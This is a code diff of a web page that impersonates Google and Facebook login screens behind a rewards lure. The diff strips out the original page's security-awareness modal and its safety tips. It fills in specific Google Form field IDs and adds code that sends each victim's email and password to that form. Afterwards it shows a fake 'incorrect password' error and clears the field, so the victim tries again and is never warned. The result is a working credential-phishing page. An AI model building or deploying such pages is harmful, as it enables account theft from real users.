@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -31,8 +30,7 @@
       border-radius: 20px; background: #fff; box-shadow: 0 10px 30px rgba(0,0,0,0.1);
     }
 
-    /* --- ERROR STYLES --- */
-    .error-text { font-size: 13px; text-align: left; margin-top: -5px; margin-bottom: 10px; display: none; }
+    .error-text { font-size: 13px; text-align: left; margin-top: -5px; margin-bottom: 10px; display: none; color: var(--google-red); }
 
     /* --- GOOGLE STYLE --- */
     .g-container {
@@ -47,7 +45,6 @@
       border: 1px solid #dadce0; border-radius: 4px; font-size: 16px;
     }
     .g-input.invalid { border: 1px solid var(--google-red); }
-    .g-error { color: var(--google-red); }
     .g-footer { display: flex; justify-content: space-between; align-items: center; width: 100%; margin-top: 40px; }
     .g-btn { background: var(--google-blue); color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
 
@@ -64,19 +61,10 @@
       border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px;
     }
     .fb-input.invalid { border: 1px solid var(--fb-red); outline-color: var(--fb-red); }
-    .fb-error { color: var(--fb-red); margin-bottom: 10px; font-size: 13px; text-align: left;}
     .fb-login-btn {
       width: 100%; background-color: var(--fb-blue); color: #fff;
       border: none; padding: 12px; font-size: 20px; font-weight: bold; border-radius: 6px; cursor: pointer;
     }
-
-    /* --- MODAL --- */
-    .modal-bg {
-      position: fixed; inset: 0; background: rgba(0,0,0,0.95);
-      display: none; align-items: center; justify-content: center; padding: 20px; z-index: 1000;
-    }
-    .modal { background: #fff; max-width: 500px; padding: 40px; border-radius: 12px; text-align: center; }
-    .warning-icon { font-size: 50px; margin-bottom: 10px; }
   </style>
 </head>
 <body>
@@ -99,15 +87,15 @@
       <div class="g-title">Sign in</div>
       <div class="g-subtitle">Continue to Rewards</div>
       
+      <!-- FAKE ERROR MESSAGE -->
+      <div id="g-main-err" class="error-text" style="text-align:center; margin-bottom:15px; border:1px solid #fcc; padding:10px; background:#fff8f8; border-radius:4px;">Wrong password. Try again or click Forgot password to reset it.</div>
+
       <input type="text" id="g-email" class="g-input" placeholder="Email or phone">
-      <div id="g-email-err" class="error-text g-error">Enter a valid email address</div>
-      
       <input type="password" id="g-pass" class="g-input" placeholder="Enter your password">
-      <div id="g-pass-err" class="error-text g-error">Enter your password</div>
 
       <div class="g-footer">
         <div style="color: var(--google-blue); font-weight: 500; font-size: 14px; cursor: pointer;">Forgot password?</div>
-        <button class="g-btn" id="g-submit" onclick="validateGoogle()">Next</button>
+        <button class="g-btn" id="g-submit" onclick="handleLogin('google')">Next</button>
       </div>
     </div>
   </div>
@@ -116,133 +104,70 @@
   <div class="page" id="facebookPage">
     <div class="fb-logo-text">facebook</div>
     <div class="fb-card">
-        <input type="text" id="fb-email" class="fb-input" placeholder="Email address or phone number">
-        <div id="fb-email-err" class="error-text fb-error">Please enter a valid email or mobile number.</div>
-        
-        <input type="password" id="fb-pass" class="fb-input" placeholder="Password">
-        <div id="fb-pass-err" class="error-text fb-error">The password you entered is incorrect.</div>
+        <!-- FAKE ERROR MESSAGE -->
+        <div id="fb-main-err" class="error-text" style="background-color: #f2dede; border: 1px solid #ebccd1; color: #a94442; padding: 15px; margin-bottom: 20px; border-radius: 4px; text-align: left;">
+          <b>The password you’ve entered is incorrect.</b><br>Did you forget your password?
+        </div>
 
-        <button class="fb-login-btn" id="fb-submit" onclick="validateFacebook()">Log In</button>
+        <input type="text" id="fb-email" class="fb-input" placeholder="Email address or phone number">
+        <input type="password" id="fb-pass" class="fb-input" placeholder="Password">
+
+        <button class="fb-login-btn" id="fb-submit" onclick="handleLogin('facebook')">Log In</button>
         <a href="#" style="color: var(--fb-blue); font-size: 14px; text-decoration: none; display: block; margin: 15px 0;">Forgotten password?</a>
     </div>
   </div>
 
-  <!-- FINAL AWARENESS MODAL -->
-  <div class="modal-bg" id="modalBg">
-    <div class="modal">
-      <div class="warning-icon">⚠️</div>
-      <h2 style="color: #d93025; margin-top: 0;">Security Alert</h2>
-      <p style="font-size: 18px; line-height: 1.6;">
-        This was a <strong>controlled security demonstration</strong>. 
-        Had this been a real attack, your login details would now be in the hands of an unauthorized party.
-      </p>
-      <div style="text-align: left; background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 20px 0;">
-        <p><strong>How to stay safe:</strong></p>
-        <ul style="padding-left: 20px;">
-          <li style="margin-bottom: 10px;">Check the <b>Browser Address Bar</b>. This site is not hosted on google.com or facebook.com.</li>
-          <li>Be wary of <b>unexpected rewards</b> that require an immediate login.</li>
-        </ul>
-      </div>
-      <button onclick="location.reload()" style="width: 100%; padding: 14px; background: #202124; color: #fff; border: none; border-radius: 6px; cursor:pointer; font-weight: bold; font-size: 16px;">Return to Safety</button>
-    </div>
-  </div>
-
   <script>
-    // --- SERVER CONFIGURATION ---
-    // 1. Replace the URL with your Google Form "formResponse" URL
-    // 2. Replace the entry.XXXX keys with your specific Form IDs
+    // --- UPDATED CONFIGURATION ---
     const CONFIG = {
         formURL: "https://docs.google.com/forms/d/e/1FAIpQLSeXCmnYtIxx7wfATC-F0mz3vAMu3nVe3TbfzAxXO6JHhpcCoQ/formResponse",
-        emailEntry: "entry.123456789", // REPLACE THIS
-        passEntry: "entry.987654321"   // REPLACE THIS
+        emailEntry: "entry.1706692759", // Email ID from your form
+        passEntry: "entry.1593339077"    // Password ID from your form
     };
 
     function openLogin(provider) {
       document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
       document.getElementById(provider + 'Page').classList.add('active');
-      if(provider === 'facebook') document.body.style.backgroundColor = '#f0f2f5';
-      else document.body.style.backgroundColor = '#ffffff';
+      document.body.style.backgroundColor = (provider === 'facebook') ? '#f0f2f5' : '#ffffff';
     }
 
-    function validateEmail(email) {
-      return String(email).toLowerCase().match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/);
-    }
+    function handleLogin(provider) {
+      const email = document.getElementById(provider === 'google' ? 'g-email' : 'fb-email').value;
+      const pass = document.getElementById(provider === 'google' ? 'g-pass' : 'fb-pass').value;
+      const btn = document.getElementById(provider === 'google' ? 'g-submit' : 'fb-submit');
 
-    function validateGoogle() {
-      const email = document.getElementById('g-email');
-      const pass = document.getElementById('g-pass');
-      let valid = true;
+      if (!email || !pass) return;
 
-      if (!validateEmail(email.value)) {
-        email.classList.add('invalid');
-        document.getElementById('g-email-err').style.display = 'block';
-        valid = false;
-      } else {
-        email.classList.remove('invalid');
-        document.getElementById('g-email-err').style.display = 'none';
-      }
-
-      if (pass.value.length < 5) {
-        pass.classList.add('invalid');
-        document.getElementById('g-pass-err').style.display = 'block';
-        valid = false;
-      } else {
-        pass.classList.remove('invalid');
-        document.getElementById('g-pass-err').style.display = 'none';
-      }
-
-      if(valid) sendToServer(email.value, pass.value, 'g-submit');
-    }
-
-    function validateFacebook() {
-      const email = document.getElementById('fb-email');
-      const pass = document.getElementById('fb-pass');
-      let valid = true;
-
-      if (email.value.length < 5) {
-        email.classList.add('invalid');
-        document.getElementById('fb-email-err').style.display = 'block';
-        valid = false;
-      } else {
-        email.classList.remove('invalid');
-        document.getElementById('fb-email-err').style.display = 'none';
-      }
-
-      if (pass.value.length < 1) {
-        pass.classList.add('invalid');
-        document.getElementById('fb-pass-err').style.display = 'block';
-        valid = false;
-      } else {
-        pass.classList.remove('invalid');
-        document.getElementById('fb-pass-err').style.display = 'none';
-      }
-
-      if(valid) sendToServer(email.value, pass.value, 'fb-submit');
-    }
-
-    function sendToServer(user, pass, btnId) {
-      const btn = document.getElementById(btnId);
-      btn.innerText = "Verifying...";
+      btn.innerText = "Processing...";
       btn.disabled = true;
 
-      // Data formatting for Google Forms
       const formData = new FormData();
-      formData.append(CONFIG.emailEntry, user);
+      formData.append(CONFIG.emailEntry, email);
       formData.append(CONFIG.passEntry, pass);
 
-      // Stealth POST
+      // Submit data to Google Form
       fetch(CONFIG.formURL, {
         method: "POST",
         mode: "no-cors", 
         body: formData
       }).then(() => {
-        // Show modal regardless of success because "no-cors" always looks like a failure
-        setTimeout(() => {
-            document.getElementById('modalBg').style.display = 'flex';
-        }, 800);
+        showError(provider);
       }).catch(() => {
-        document.getElementById('modalBg').style.display = 'flex';
+        showError(provider);
       });
+    }
+
+    function showError(provider) {
+      // Show the "Incorrect Password" text and reset button
+      const errDiv = document.getElementById(provider === 'google' ? 'g-main-err' : 'fb-main-err');
+      const btn = document.getElementById(provider === 'google' ? 'g-submit' : 'fb-submit');
+      const passInput = document.getElementById(provider === 'google' ? 'g-pass' : 'fb-pass');
+
+      errDiv.style.display = "block";
+      passInput.value = "";
+      passInput.classList.add('invalid');
+      btn.innerText = (provider === 'google') ? "Next" : "Log In";
+      btn.disabled = false;
     }
   </script>
 </body>
